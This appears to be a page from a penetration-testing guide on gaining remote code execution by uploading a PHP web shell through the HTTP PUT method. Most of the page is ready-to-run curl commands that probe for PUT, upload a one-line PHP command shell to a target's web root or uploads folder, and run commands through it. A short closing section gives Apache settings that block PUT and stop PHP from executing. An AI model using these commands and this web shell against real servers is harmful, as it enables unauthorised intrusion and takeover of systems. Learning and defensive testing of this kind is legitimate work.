# 2.3 PUT Upload

## Goal

Upload files directly using HTTP PUT method without traditional upload form, bypassing client-side upload restrictions.

---

## Discovery

### Step 1: Check OPTIONS Request

```bash
curl -X OPTIONS http://target/shell.php -v
```

**Response headers to look for:**
```
Allow: GET, POST, PUT, DELETE, OPTIONS
```

If PUT is in Allow header → VULNERABLE

### Step 2: Test PUT Upload

```bash
curl -X PUT http://target/shell.php -d '<?php system($_GET["c"]); ?>'
```

**Success indicators:**
- 201 Created
- 204 No Content
- 200 OK

---

## PUT Upload Techniques

### Technique 1: Simple PUT

```bash
# Create PHP file
echo '<?php system($_GET["c"]); ?>' > shell.php

# Upload via PUT
curl -X PUT http://target/uploads/shell.php --data-binary @shell.php
```

### Technique 2: PUT with Authentication

```bash
# If basic auth required
curl -X PUT http://target/uploads/shell.php \
  --data-binary @shell.php \
  -u username:password
```

### Technique 3: PUT with Custom Headers

```bash
curl -X PUT http://target/uploads/shell.php \
  --data-binary @shell.php \
  -H "Content-Type: application/octet-stream" \
  -H "X-Custom-Header: value"
```

### Technique 4: PUT to Web Root

```bash
# Try uploading directly to web root
curl -X PUT http://target/shell.php --data-binary @shell.php

# Then access
curl http://target/shell.php?c=id
```

## Real-World Examples

### Example 1: WebDAV Enabled

```
WebDAV often enabled on development servers
GET http://target/shell.php → 404 (doesn't exist yet)
PUT http://target/shell.php → 201 Created
GET http://target/shell.php → 200 OK (now executes)
RCE!
```

### Example 2: RESTful API

```
Some REST APIs use PUT for updates:
PUT /api/file/shell.php
With file content in body
Result: File written to web root
```

### Example 3: Content Management System

```
CMS might accept PUT for asset uploads:
PUT /assets/shell.php
Server stores without validation
RCE achieved
```

## Prevention (For Developers)

❌ **Bad:** Allow PUT unconditionally

```apache
<Directory /var/www/html>
    allow from all
</Directory>
```

✅ **Good:** Disable PUT method

```apache
<Directory /var/www/html>
    <LimitExcept GET POST HEAD>
        deny from all
    </LimitExcept>
</Directory>
```

✅ **Better:** Configure proper permissions

```apache
# Disable execution in upload directory
<Directory /var/www/html/uploads>
    php_flag engine off
    AddType text/plain .php .phtml .php3 .php4 .php5 .php7 .pht .phps
</Directory>

# Only allow GET/POST
<LimitExcept GET POST HEAD>
    deny from all
</LimitExcept>
```

## Success Indicators

**PUT upload vulnerable if:**
- ✅ OPTIONS shows PUT allowed
- ✅ PUT request returns 201 or 204
- ✅ File appears at location
- ✅ File executes when accessed

**Not vulnerable if:**
- ❌ OPTIONS denies PUT
- ❌ PUT returns 405 Method Not Allowed
- ❌ File not accessible
- ❌ File not executable

---

## Limitations

- **Rarity:** Less common than form-based uploads
- **Restriction:** Often disabled on production
- **Detection:** Easy to detect in logs
- **Reliability:** Depends on server configuration
